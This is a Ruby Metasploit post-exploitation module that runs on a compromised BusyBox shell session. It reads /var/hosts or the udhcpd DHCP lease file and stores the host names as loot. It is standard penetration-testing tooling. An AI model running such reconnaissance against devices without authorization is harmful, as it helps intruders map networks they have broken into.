##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Busybox

  def initialize
    super(
      'Name'         => 'BusyBox Enumerate Hosts',
      'Description'  => %q{
        This module will be applied on a session connected to a BusyBox shell. It will enumerate
        host names related to the device executing BusyBox.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )
  end

  def run
    print_status('Searching hosts files...')
    if file_exists('/var/hosts')
      hosts_file = '/var/hosts'
    elsif file_exists('/var/udhcpd/udhcpd.leases')
      hosts_file = '/var/udhcpd/udhcpd.leases'
    else
      print_error('Files not found')
      return
    end

    read_hosts_file(hosts_file)
  end

  def read_hosts_file(file)
    begin
      str_file=read_file(file)
      print_good("Hosts File found: #{file}.")
      vprint_line(str_file)
      p = store_loot('busybox.enum.hosts', 'text/plain', session, str_file, file, 'BusyBox Device host names')
      print_good("Hosts saved to #{p}.")
    rescue EOFError
      print_error("Nothing read from file: #{file}, file may be empty.")
    end
  end

end
